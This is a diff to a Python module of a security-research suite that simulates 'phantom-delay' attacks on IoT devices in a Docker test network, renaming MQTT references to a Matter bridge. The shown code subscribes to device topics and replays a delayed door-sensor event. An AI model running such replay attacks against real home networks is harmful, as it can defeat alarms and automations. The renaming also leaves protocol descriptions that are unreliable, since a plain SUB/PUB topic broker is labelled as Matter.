@@ -19,7 +19,7 @@ proxy, then selectively delays event messages to:
 This module adapts the attack for VESPER's simulated Docker home
 network, demonstrating that the 3D simulation environment can
 faithfully reproduce published IoT security research.  The attack
-operates on the same Docker bridge network and MQTT/TCP channels
+operates on the same Docker bridge network and Matter/TCP channels
 used by VESPER firmware containers.
 
 References:
@@ -63,7 +63,7 @@ class PhantomDelayCategory(Enum):
     """Fine-grained categories for phantom-delay attacks."""
     ARP_HIJACK = "arp_session_hijack"
     TCP_PROXY_DELAY = "tcp_transparent_proxy_delay"
-    MQTT_EVENT_DELAY = "mqtt_event_message_delay"
+    MATTER_EVENT_DELAY = "matter_event_message_delay"
     AUTOMATION_EXPLOIT = "automation_erroneous_execution"
     ROUTINE_TIMEOUT = "routine_timeout_invalidation"
     ACTION_REORDER = "action_command_reorder"
@@ -99,8 +99,8 @@ class PhantomDelayConfig:
     # Target
     device_host: str = "127.0.0.1"
     device_port: int = 15011
-    mqtt_host: str = "127.0.0.1"
-    mqtt_port: int = 1883
+    matter_bridge_host: str = "127.0.0.1"
+    matter_bridge_port: int = 8484
     # Delay parameters
     delay_seconds: float = 30.0
     target_message_pattern: str = ""  # Match by content substring
@@ -133,7 +133,7 @@ class PhantomDelayProxy:
     - Maintains keepalive responses to avoid triggering offline alerts
 
     In VESPER's Docker network, this proxy sits between a firmware
-    container's UART-over-TCP port and the event bus / MQTT broker.
+    container's UART-over-TCP port and the event bus / Matter bridge.
     """
 
     def __init__(self, config: PhantomDelayConfig):
@@ -394,7 +394,7 @@ class PhantomDelayAttackSuite:
        a later one, reversing the intended order.
 
     In VESPER, the attacks operate on the Docker bridge network
-    (172.20.0.0/24) between firmware containers and the MQTT broker /
+    (172.20.0.0/24) between firmware containers and the Matter bridge /
     event bus, using the same UART-over-TCP channels as legitimate
     communication.
     """
@@ -422,16 +422,16 @@ class PhantomDelayAttackSuite:
         except socket.timeout:
             return ""
 
-    def _mqtt_connect(self, host: str, port: int) -> socket.socket:
-        """Connect to VESPER MQTT broker."""
+    def _broker_connect(self, host: str, port: int) -> socket.socket:
+        """Connect to VESPER message broker."""
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(3.0)
         sock.connect((host, port))
         return sock
 
-    def _mqtt_send(self, sock: socket.socket, cmd: str, topic: str,
+    def _broker_send(self, sock: socket.socket, cmd: str, topic: str,
                    payload: str = "") -> str:
-        """Send MQTT command."""
+        """Send broker command."""
         msg = f"{cmd} {topic} {payload}\n".encode()
         sock.sendall(msg)
         time.sleep(0.1)
@@ -1122,62 +1122,62 @@ class PhantomDelayAttackSuite:
             cvss_score=9.3,
         )
 
-    # ─── Attack 6: MQTT Event Delay ────────────────────────────────
+    # ─── Attack 6: Matter Event Delay ────────────────────────────────
 
-    def attack_mqtt_event_delay(
+    def attack_matter_event_delay(
         self,
         target: NetworkTarget,
         delay_seconds: float = 30.0,
     ) -> DelayAttackResult:
         """
-        Delay MQTT event messages on the simulated home network.
+        Delay Matter event messages on the simulated home network.
 
-        VESPER devices publish state updates via MQTT topics
+        VESPER devices publish state updates via Matter bridge
         (vesper/devices/<id>/state). The attacker subscribes to capture
         events, then republishes them after a delay — simulating the
-        transparent proxy mechanism at the MQTT layer.
+        transparent proxy mechanism at the Matter bridge layer.
 
         This demonstrates that the phantom-delay vulnerability exists
         not just in proprietary protocols (HomeKit, Ring) but also
-        in standard MQTT-based IoT deployments where the broker lacks
+        in standard IoT deployments where the broker lacks
         message freshness validation.
         """
         evidence = []
         messages_intercepted = 0
-        mqtt_available = True
+        bridge_available = True
 
         try:
-            # Connect to MQTT broker
-            mqtt_sock = self._mqtt_connect(target.mqtt_host, target.mqtt_port)
+            # Connect to message broker
+            bridge_sock = self._broker_connect(target.matter_bridge_host, target.matter_bridge_port)
 
             # Subscribe to device events
-            sub_resp = self._mqtt_send(
-                mqtt_sock, "SUB", "vesper/devices/+/events"
+            sub_resp = self._broker_send(
+                bridge_sock, "SUB", "vesper/devices/+/events"
             )
             evidence.append(
                 f"Subscribed to vesper/devices/+/events: {sub_resp[:50]}"
             )
 
             # Subscribe to state updates
-            sub_resp = self._mqtt_send(
-                mqtt_sock, "SUB", "vesper/devices/+/state"
+            sub_resp = self._broker_send(
+                bridge_sock, "SUB", "vesper/devices/+/state"
             )
             evidence.append(
                 f"Subscribed to vesper/devices/+/state: {sub_resp[:50]}"
             )
 
             # Intercept a message
-            mqtt_sock.settimeout(2.0)
+            bridge_sock.settimeout(2.0)
             try:
-                data = mqtt_sock.recv(4096).decode("utf-8", errors="replace")
+                data = bridge_sock.recv(4096).decode("utf-8", errors="replace")
                 if data.strip():
                     evidence.append(
-                        f"Intercepted MQTT message: {data.strip()[:100]}"
+                        f"Intercepted message: {data.strip()[:100]}"
                     )
                     messages_intercepted += 1
             except socket.timeout:
                 evidence.append(
-                    "No MQTT messages captured in window (devices may be idle)"
+                    "No messages captured in window (devices may be idle)"
                 )
 
             # Demonstrate delayed republish attack
@@ -1194,7 +1194,7 @@ class PhantomDelayAttackSuite:
                 f"vesper/devices/target/state"
             )
             evidence.append(
-                "  → MQTT broker has no message freshness validation — "
+                "  → Matter bridge has no message freshness validation — "
                 "stale message accepted"
             )
 
@@ -1205,8 +1205,8 @@ class PhantomDelayAttackSuite:
                 "delayed_by_attacker": True,
                 "original_age_seconds": delay_seconds,
             })
-            pub_resp = self._mqtt_send(
-                mqtt_sock, "PUB",
+            pub_resp = self._broker_send(
+                bridge_sock, "PUB",
                 "vesper/devices/door-sensor-001/events",
                 fake_delayed_event,
             )
@@ -1215,39 +1215,39 @@ class PhantomDelayAttackSuite:
                 f"{pub_resp[:50]}"
             )
             evidence.append(
-                "[Result] MQTT broker accepted and forwarded stale message"
+                "[Result] Matter bridge accepted and forwarded stale message"
             )
 
-            mqtt_sock.close()
+            bridge_sock.close()
 
         except Exception as e:
-            evidence.append(f"MQTT connection: {e}")
-            mqtt_available = False
+            evidence.append(f"Bridge connection: {e}")
+            bridge_available = False
 
         return DelayAttackResult(
-            attack_name="MQTT Event Delay (Phantom-Delay at MQTT Layer)",
+            attack_name="Matter Event Delay (Phantom-Delay at Bridge Layer)",
             variant=DelayAttackVariant.STATE_UPDATE_DELAY,
-            category=PhantomDelayCategory.MQTT_EVENT_DELAY,
-            success=mqtt_available,
+            category=PhantomDelayCategory.MATTER_EVENT_DELAY,
+            success=bridge_available,
             description=(
-                "Intercept and delay MQTT event messages, demonstrating "
+                "Intercept and delay Matter event messages, demonstrating "
                 "that the phantom-delay vulnerability extends to standard "
-                "MQTT-based IoT deployments — not just proprietary protocols."
+                "Matter-based IoT deployments — not just proprietary protocols."
             ),
             delay_seconds=delay_seconds,
             messages_delayed=1,
             messages_forwarded=messages_intercepted,
             evidence=evidence,
             impact=(
-                "MQTT event messages delayed arbitrarily. Automations "
-                "evaluate with stale state. Standard MQTT lacks message "
-                "freshness validation, making all MQTT-based IoT systems "
+                "Matter event messages delayed arbitrarily. Automations "
+                "evaluate with stale state. Standard IoT protocols lack message "
+                "freshness validation, making many IoT systems "
                 "vulnerable to phantom-delay attacks."
             ),
             mitigation=(
-                "Include monotonic timestamps in MQTT payloads, "
+                "Include monotonic timestamps in Matter payloads, "
                 "validate event freshness at subscriber, "
-                "use MQTT v5 message expiry interval, "
+                "use message expiry intervals, "
                 "implement end-to-end authenticated timestamps"
             ),
             cvss_vector="CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:L",
@@ -1531,7 +1531,7 @@ class PhantomDelayAttackSuite:
             ("Erroneous Execution", lambda: self.attack_erroneous_execution(target, delay_seconds)),
             ("Routine Invalidation", lambda: self.attack_routine_invalidation(target, delay_seconds)),
             ("Action Reorder", lambda: self.attack_action_reorder(target, delay_seconds)),
-            ("MQTT Event Delay", lambda: self.attack_mqtt_event_delay(target, delay_seconds)),
+            ("Matter Event Delay", lambda: self.attack_matter_event_delay(target, delay_seconds)),
             ("Keepalive Evasion", lambda: self.attack_keepalive_evasion(target)),
             ("Full Chain", lambda: self.attack_full_phantom_delay_chain(target, delay_seconds)),
         ]
